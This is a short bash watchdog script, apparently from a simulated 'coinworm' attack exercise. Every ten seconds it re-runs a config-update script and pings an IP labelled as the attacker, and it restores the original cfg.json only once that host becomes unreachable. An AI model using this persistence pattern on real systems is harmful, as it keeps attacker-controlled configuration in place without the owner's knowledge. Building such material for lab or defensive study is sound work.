#!/bin/bash
UPDATE_SCRIPT="/coinworm/update_cfg.sh"
RESTORE_SCRIPT="/coinworm/restore_cfg.sh"
CHECK_IP="198.18.14.2"
SLEEP_INTERVAL=10

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

while true; do
    # Run update first
    bash "$UPDATE_SCRIPT"

    # Ping attacker
    if ! ping -c 3 -W 2 "$CHECK_IP" > /dev/null 2>&1; then
        log "Attacker $CHECK_IP unreachable. Restoring cfg.json config."
        bash "$RESTORE_SCRIPT"
        log "Restore completed. Exiting watchdog."
        exit 0
    else
        log "Attacker $CHECK_IP reachable. No restoring."
    fi

    sleep "$SLEEP_INTERVAL"
done
